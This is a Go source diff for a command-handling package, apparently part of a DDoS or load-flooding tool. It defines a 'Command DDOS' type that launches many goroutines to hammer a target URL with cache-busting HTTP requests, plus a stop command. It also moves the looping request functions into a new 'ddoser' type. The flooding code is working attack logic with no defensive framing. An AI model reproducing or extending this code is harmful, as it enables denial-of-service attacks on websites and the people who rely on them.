@@ -2,7 +2,6 @@ package utils
 
 import (
 	"fmt"
-	"net/http"
 	"strconv"
 )
 
@@ -11,6 +10,7 @@ type LTCommand interface {
 	Execute()
 }
 
+// Command DDOS
 type LTCommandDDOS struct {
 	Id       int
 	Url      string
@@ -24,11 +24,13 @@ func (ltc *LTCommandDDOS) GetId() (id int) {
 }
 
 func (ltc *LTCommandDDOS) Execute() {
+	d := ddoser{}
 	for i := 0; i < ltc.Routines; i++ {
-		go performMultiRequest(ltc.Url+"?a="+strconv.Itoa(i), ltc.Requests)
+		go d.PerformMultiRequest(ltc.Url+"?a="+strconv.Itoa(i), ltc.Requests)
 	}
 }
 
+// Command Stop
 type LTCommandStop struct {
 	Id int
 }
@@ -42,53 +44,11 @@ func (ltc *LTCommandStop) Execute() {
 	GetHelper().FL_QUIT = true
 }
 
+// Errors
 type LTCommandError struct {
 	command CommandType
 }
 
 func (e LTCommandError) Error() string {
 	return fmt.Sprintf("Uncknown command \"%s\"", e.command.Name)
-}
-
-//func PutCommand(){
-//	h := GetHelper()
-//	h.CommandStack = append(h.CommandStack,	CommandType{100, "ddos", nil})
-//	print(h.CommandStack)
-//}
-//
-//func GetCommand(){
-//	h := GetHelper()
-//	h.CommandStack = append(h.CommandStack[:1], h.CommandStack[2:]...)
-//}
-
-func performRequest(url string) (status int) {
-	status = 0
-	resp, err := http.Get(url)
-	if err == nil {
-		status = resp.StatusCode
-		WriteLog(status, " ", url)
-		resp.Body.Close()
-	} else {
-		status = -1
-		WriteLog(err)
-	}
-	return status
-}
-
-func performMultiRequest(url string, count int) {
-	if count == 0 {
-		for {
-			if !GetHelper().FL_KEEP_GOING {
-				break
-			}
-			GetHelper().C <- performRequest(url)
-		}
-	} else {
-		for i := 0; i < count; i++ {
-			if !GetHelper().FL_KEEP_GOING {
-				break
-			}
-			GetHelper().C <- performRequest(url)
-		}
-	}
 }
